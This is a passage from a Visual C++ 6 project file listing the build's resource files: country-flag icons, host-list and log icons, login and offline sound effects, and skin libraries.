SOURCE=".\res\guoqiico\伊朗.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\以色列.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\意大利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\印度.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\印度尼西亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\英格兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\英国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\硬盘.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\用户.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\约旦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\越南.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\运行时间.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\赞比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\乍得.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\智利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\中非.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\中国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\重复上线.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\瑙鲁.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\梵蒂冈.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guoqiico\斐济.ico"
# End Source File
# Begin Source File

SOURCE=.\USkin.lib
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\Wave\login.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\offline.wav
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\Wave\Setting.wav
# End Source File
# Begin Source File

SOURCE=..\Bin\SkinH.dll
# End Source File
# Begin Source File

SOURCE=..\Bin\Skins\SkinH.she
# End Source File
# Begin Source File

SOURCE=.\res\xpstyle.manifest
# End Source File
# End Target
# End Project
